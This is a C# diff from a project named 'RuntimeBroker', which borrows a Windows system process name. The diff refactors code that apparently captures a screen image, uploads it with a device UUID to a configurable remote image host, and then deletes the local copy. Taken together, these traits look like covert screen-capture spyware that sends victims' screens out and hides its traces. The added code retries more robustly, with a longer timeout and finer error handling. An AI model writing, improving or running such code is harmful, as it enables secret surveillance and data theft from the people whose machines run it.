@@ -46,47 +46,93 @@ namespace RuntimeBroker
             }
         }
 
-        private void UploadImage(string imagePath)
+        private async Task UploadImageAsync(string imagePath)
         {
             try
             {
-                _ = Task.Run(async () =>
+                bool isOnline = await AppUtils.IsOnline();
+                if (isOnline)
                 {
                     try
                     {
-                        bool isOnline = await AppUtils.IsOnline();
-                        if (isOnline)
+                        //var client = new HttpClient();
+                        //var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
+                        //request.Headers.Add("accept", "*/*");
+                        //var content = new MultipartFormDataContent();
+                        //content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
+                        //content.Add(new StringContent(Globals.UUID), "token");
+                        //request.Content = content;
+                        //var response = await client.SendAsync(request);
+                        //response.EnsureSuccessStatusCode();
+                        //string result = await response.Content.ReadAsStringAsync();
+
+
+                        var handler = new HttpClientHandler
                         {
-                            try
+                            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate
+                        };
+
+                        var client = new HttpClient(handler)
+                        {
+                            Timeout = TimeSpan.FromMinutes(5) // Increase the timeout
+                        };
+
+                        var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
+                        request.Headers.Add("accept", "*/*");
+
+                        var content = new MultipartFormDataContent();
+
+                        try
+                        {
+                            using (var fileStream = File.OpenRead(imagePath))
                             {
-                                var client = new HttpClient();
-                                var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
-                                request.Headers.Add("accept", "*/*");
-                                var content = new MultipartFormDataContent();
-                                content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
+                                content.Add(new StreamContent(fileStream), "Image", Path.GetFileName(imagePath));
                                 content.Add(new StringContent(Globals.UUID), "token");
                                 request.Content = content;
+
                                 var response = await client.SendAsync(request);
                                 response.EnsureSuccessStatusCode();
+
                                 string result = await response.Content.ReadAsStringAsync();
-                            }
-                            catch (Exception ex)
-                            {
-                                Log($"{ex.Message}");
+                                // Process the result as needed
                             }
                         }
-
+                        catch (IOException ex)
+                        {
+                            // Handle file access exceptions
+                            Console.WriteLine($"File access error: {ex.Message}");
+                        }
+                        catch (HttpRequestException ex)
+                        {
+                            // Handle HTTP request exceptions
+                            Console.WriteLine($"HTTP request error: {ex.Message}");
+                        }
+                        catch (TaskCanceledException ex)
+                        {
+                            // Handle timeout exception
+                            Console.WriteLine($"Request timed out: {ex.Message}");
+                        }
+                        catch (Exception ex)
+                        {
+                            // Handle any other exceptions
+                            Console.WriteLine($"Unexpected error: {ex.Message}");
+                        }
+                        finally
+                        {
+                            content.Dispose();
+                        }
                     }
-                    catch (Exception ex) { Log($"{ex.Message}"); }
-                    finally
+                    catch (Exception ex)
                     {
-                        File.Delete(imagePath);
+                        Log($"{ex.Message}");
                     }
-                });
+                }
+
             }
-            catch (Exception ex)
+            catch (Exception ex) { Log($"{ex.Message}"); }
+            finally
             {
-                Log(ex.ToString());
+                File.Delete(imagePath);
             }
         }
 
@@ -111,7 +157,10 @@ namespace RuntimeBroker
                 bmp.Dispose();
                 bmp = null;
 
-                UploadImage(imageFile);
+                if (File.Exists(imageFile))
+                {
+                    UploadImageAsync(imageFile);
+                }
             }
             catch (Exception ex)
             {
